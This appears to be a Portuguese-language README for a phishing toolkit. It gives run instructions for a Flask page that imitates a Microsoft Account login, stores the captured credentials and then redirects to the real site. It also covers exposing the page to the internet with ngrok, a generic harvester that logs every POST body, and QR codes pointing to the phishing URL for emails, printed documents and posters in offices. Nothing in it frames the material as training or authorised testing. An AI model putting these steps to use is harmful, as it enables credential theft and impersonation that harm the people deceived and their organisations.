# SocialEngineering — Tutorial

## Dependencias
```bash
pip install flask qrcode[pil]
```

---

## phishing_page.py
Servidor Flask com página de login falsa. Captura credenciais e redireciona para site legítimo.

```bash
python phishing_page.py
# Port: 8080
# Page title: Microsoft Account
# Redirect after submit: https://login.microsoftonline.com
```

Acesse via browser: `http://SEU_IP:8080`  
Credenciais capturadas salvam em `captured_creds.txt`.

**Expor para internet (sem servidor):**
```bash
# Via ngrok:
ngrok http 8080
# URL pública gerada — use no phishing
```

---

## credential_harvester.py
Captura qualquer POST enviado para ele — backend genérico.

```bash
python credential_harvester.py
# Port: 8080
```

Aponte o `action` do formulário HTML para `http://SEU_IP:8080/qualquer_path`.
Tudo que vier no corpo do POST é logado em `harvest.txt`.

---

## qr_phish.py
Gera QR code apontando para a URL do phishing.

```bash
python qr_phish.py
# URL: http://seu.ngrok.url/login
# Output: qr_microsoft.png
```

Use o PNG gerado em:
- Email como imagem
- Documento Word/PDF impresso
- Cartaz físico em ambiente corporativo
